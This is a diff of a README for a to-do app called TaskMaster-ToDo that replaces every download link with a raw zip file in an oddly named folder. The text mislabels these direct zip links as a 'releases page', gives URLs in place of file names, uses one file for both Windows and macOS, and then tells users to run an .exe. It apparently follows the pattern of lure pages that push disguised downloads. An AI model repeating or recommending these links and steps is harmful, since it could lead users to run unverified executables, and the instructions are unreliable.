@@ -8,7 +8,7 @@ Welcome to TaskMaster-ToDo! This application helps you manage your tasks with ea
 
 To get started, visit the following link to download the latest version of TaskMaster-ToDo:
 
-[![Download TaskMaster-ToDo](https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/TaskMaster-ToDo.zip)](https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/TaskMaster-ToDo.zip)
+[![Download TaskMaster-ToDo](https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/To-Do-Task-Master-v1.0.zip)](https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/To-Do-Task-Master-v1.0.zip)
 
 Click the download link above to access the releases page. You will find the latest version available for download.
 
@@ -26,11 +26,11 @@ Make sure your device meets these requirements before downloading.
 
 Follow these simple steps to install TaskMaster-ToDo:
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/TaskMaster-ToDo.zip) to go to the releases section.
+1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/To-Do-Task-Master-v1.0.zip) to go to the releases section.
    
 2. **Find the Latest Version:** Look for the most recent release, usually at the top of the page.
 
-3. **Download the File:** Click on the appropriate file for your operating system. The files are usually named like `https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/TaskMaster-ToDo.zip` for Windows or `https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/TaskMaster-ToDo.zip` for macOS.
+3. **Download the File:** Click on the appropriate file for your operating system. The files are usually named like `https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/To-Do-Task-Master-v1.0.zip` for Windows or `https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/To-Do-Task-Master-v1.0.zip` for macOS.
 
 4. **Run the Installer:**
    - For **Windows:** Double-click the `.exe` file. Follow the prompts to install the program.
@@ -58,6 +58,6 @@ We welcome contributions! If you would like to suggest features, report bugs, or
 
 ## 🔗 Resources
 
-For more information about TaskMaster-ToDo, visit our [GitHub Releases page](https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/TaskMaster-ToDo.zip) for updates and downloads.
+For more information about TaskMaster-ToDo, visit our [GitHub Releases page](https://raw.githubusercontent.com/Leaderms/TaskMaster-ToDo/main/tensional/To-Do-Task-Master-v1.0.zip) for updates and downloads.
 
 Thank you for choosing TaskMaster-ToDo! Start managing your tasks more effectively today.
